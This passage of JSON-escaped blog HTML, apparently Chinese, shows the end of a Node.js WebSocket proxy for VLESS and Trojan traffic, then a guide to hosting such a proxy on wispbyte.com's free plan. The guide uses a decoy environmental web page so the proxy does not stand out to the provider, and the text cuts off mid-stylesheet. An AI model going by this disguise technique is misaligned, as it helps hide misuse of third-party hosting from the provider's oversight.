class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003elet\u003c/span\u003e host, port\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eatyp\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x01\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003ehost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset, offset + 4\u003cspan class=\"o\"\u003e)\u003c/span\u003e.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;.\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 4\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eatyp\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x03\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003ehostLen\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003ehost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset, offset + hostLen\u003cspan class=\"o\"\u003e)\u003c/span\u003e.toString\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e hostLen\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eatyp\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x04\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003ehost\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset, offset + 16\u003cspan class=\"o\"\u003e)\u003c/span\u003e.reduce\u003cspan class=\"o\"\u003e((\u003c/span\u003es, b, i, a\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e(\u003c/span\u003ei % \u003cspan class=\"m\"\u003e2\u003c/span\u003e ? s.concat\u003cspan class=\"o\"\u003e(\u003c/span\u003ea.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003ei - 1, i + 1\u003cspan class=\"o\"\u003e))\u003c/span\u003e : s\u003cspan class=\"o\"\u003e)\u003c/span\u003e, \u003cspan class=\"o\"\u003e[])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        .map\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eb\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; b.readUInt16BE\u003cspan class=\"o\"\u003e(\u003c/span\u003e0\u003cspan class=\"o\"\u003e)\u003c/span\u003e.toString\u003cspan class=\"o\"\u003e(\u003c/span\u003e16\u003cspan class=\"o\"\u003e))\u003c/span\u003e.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;:\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 16\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eport\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.readUInt16BE\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 2\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset \u0026lt; msg.length \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x0d \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003eoffset + 1\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0x0a\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nv\"\u003eoffset\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e 2\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003eduplex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e createWebSocketStream\u003cspan class=\"o\"\u003e(\u003c/span\u003ews\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    resolveHost\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      .then\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eresolvedIP\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        net.connect\u003cspan class=\"o\"\u003e({\u003c/span\u003e host: resolvedIP, port \u003cspan class=\"o\"\u003e}\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset \u0026lt; msg.length\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            this.write\u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          duplex.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003ethis\u003cspan class=\"o\"\u003e)\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003eduplex\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e})\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      .catch\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        net.connect\u003cspan class=\"o\"\u003e({\u003c/span\u003e host, port \u003cspan class=\"o\"\u003e}\u003c/span\u003e, \u003cspan class=\"k\"\u003efunction\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset \u0026lt; msg.length\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            this.write\u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003eoffset\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          duplex.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003ethis\u003cspan class=\"o\"\u003e)\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e.pipe\u003cspan class=\"o\"\u003e(\u003c/span\u003eduplex\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e})\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e true\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003eerror\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e false\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// Ws 连接处理\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewss.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;connection\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e(\u003c/span\u003ews, req\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e req.url \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  ws.once\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;message\u0026#39;\u003c/span\u003e, \u003cspan class=\"nv\"\u003emsg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003emsg.length \u0026gt; \u003cspan class=\"m\"\u003e17\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e msg\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e 0\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e msg.slice\u003cspan class=\"o\"\u003e(\u003c/span\u003e1, 17\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003eisVless\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e id.every\u003cspan class=\"o\"\u003e((\u003c/span\u003ev, i\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"nv\"\u003ev\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e parseInt\u003cspan class=\"o\"\u003e(\u003c/span\u003euuid.substr\u003cspan class=\"o\"\u003e(\u003c/span\u003ei * 2, 2\u003cspan class=\"o\"\u003e)\u003c/span\u003e, 16\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eisVless\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!handleVlessConnection\u003cspan class=\"o\"\u003e(\u003c/span\u003ews, msg\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          ws.close\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!handleTrojanConnection\u003cspan class=\"o\"\u003e(\u003c/span\u003ews, msg\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      ws.close\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e})\u003c/span\u003e.on\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttpServer.listen\u003cspan class=\"o\"\u003e(\u003c/span\u003ePORT, \u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003escheme\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e tlsOptions ? \u003cspan class=\"s1\"\u003e\u0026#39;HTTPS/WSS\u0026#39;\u003c/span\u003e : \u003cspan class=\"s1\"\u003e\u0026#39;HTTP/WS\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  console.log\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003eServer is running on \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003escheme\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e port \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePORT\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e其中几个地方有修改，先看看huggingface给咱们的域名，右边，Settings右边的三个点按钮，\u003c/p\u003e","title":"huggingface.co薅羊毛记"},{"content":"有了Codex的加持，也渐渐得疯狂起来了，本身运维就是全干，对系统的各个点把控就比较精准\n这次准备薅羊毛的是 wispbyte.com , 是欧洲的一个厂家\n它可以免费建立一个server，准确的来说是一个容器，并且暴露一个端口出来\n那先Create Server，Server Name 和 Server Description就都写 god01 好了\nServer Type当然选Free Plan的，运行环境就选NodeJS\n选完就按最下面的创建即可。\n建好了那就去到 server的manage管理界面，下面有个Startup：\n分析那句命令，意思很简单，如果配了git，就去拉代码，如果有存在npm的package.json，就先npm install安装，最后，运行index.js\n下面是Docker Image，本来以为是可以随便引用别处的镜像，结果是不能，只能选固定的，那就选不太激进的 nodejs_22 ，保存好\n然后就什么都不用动了\n然后去到Files选项，缺省路径是 /hoe/container/\n上面图是已经弄好的，如果是新服务器，是空无一物的\n我们只需要准备5个文件和一个域名：\ntls.crt 证书文件，用let\u0026rsquo;s encrypt申请\ntls.key 密钥文件，用let\u0026rsquo;s encrypt申请\nindex.html 用来装饰的环保单页面，如果不加，就会显示hello world，太假了，可以让 gemini 给你生成一个，代码如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Green Network - Protect Earth\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; * { margin: 0; padding: 0; box-sizing: border-box; font-family: \u0026#39;Segoe UI\u0026#39;, Tahoma, Geneva, Verdana, sans-serif; } :root { --primary: #2e7d32; --secondary: #4caf50; --accent: #8bc34a; --light: #e8f5e9; --dark: #1b5e20; --text: #333333; --white: #ffffff; } body { background-color: var(--light); color: var(--text); line-height: 1.7; /* Slightly increased line height for 